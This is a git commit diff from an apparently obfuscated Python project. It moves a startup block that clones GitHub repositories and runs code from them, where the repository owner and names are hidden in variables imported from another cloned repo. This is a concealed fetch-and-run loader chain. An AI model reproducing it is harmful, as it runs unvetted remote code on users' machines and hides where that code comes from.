541dc37150b233d79b8f079355df2b18f65aeeed
hypevoidsouls <hypevoidsoul@yahoo.com>
2021-07-07 01:37:58 +0530

    🎧

--- bash.py
+++ bash.py
@@ -1,6 +1,2 @@
-import os
-os.system("git clone https://github.com/hypevoidsouls/knite.git")
-from knite import *
-os.system("git clone https://github.com/{}/{}.git".format(BASH,KASH))
 import subprocess
 subprocess.run("python3 -m Ӽɛʀօռօɨɖ & python3 -m ᴄᴏɴᴄᴇᴘᴛ", shell=True)
--- ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
+++ ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
@@ -1,15 +1,4 @@
 import os
-os.system(f"git clone https://github.com/HypeVoidSoul/LOL.git")
-from LOL.lol import *
-os.system(f"git clone https://github.com/{FTS}/{AA}.git")
-os.system(f"git clone https://github.com/{FTS}/{BB}.git")
-os.system(f"git clone https://github.com/{FTS}/{CC}.git")
-os.system(f"git clone https://github.com/{FTS}/{DD}.git")
-os.system(f"git clone https://github.com/{FTS}/{EE}.git")
-os.system(f"git clone https://github.com/{FTS}/{FF}.git")
-os.system(f"git clone https://github.com/{FTS}/{GG}.git")
-os.system(f"git clone https://github.com/{FTS}/{HH}.git")
-os.system(f"python {FST}")
-
-
-
+os.system("git clone https://github.com/hypevoidsouls/knite.git")
+from knite import *
+os.system("git clone https://github.com/{}/{}.git".format(BASH,KASH))
